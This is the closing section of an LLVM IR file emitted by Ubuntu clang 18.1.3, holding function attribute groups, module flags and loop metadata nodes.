attributes #5 = { nounwind "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cmov,+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { nocallback nofree nounwind willreturn memory(argmem: write) }
attributes #7 = { nocallback nofree nounwind willreturn memory(argmem: readwrite) }
attributes #8 = { nounwind memory(none) }
attributes #9 = { allocsize(0) }
attributes #10 = { nounwind memory(read) }

!llvm.ident = !{!0, !0, !0, !0}
!llvm.module.flags = !{!1, !2, !3, !4}

!0 = !{!"Ubuntu clang version 18.1.3 (1ubuntu1)"}
!1 = !{i32 1, !"wchar_size", i32 2}
!2 = !{i32 8, !"PIC Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 2}
!4 = !{i32 1, !"MaxTLSAlign", i32 65536}
!5 = distinct !{!5, !6}
!6 = !{!"llvm.loop.mustprogress"}
!7 = !{i64 15868025}
!8 = distinct !{!8, !6}
!9 = distinct !{!9, !6}
!10 = distinct !{!10, !6}
!11 = !{i64 1203}
!12 = distinct !{!12, !6}
!13 = distinct !{!13, !6}
!14 = !{i64 18271274}
!15 = !{i64 2148227777}
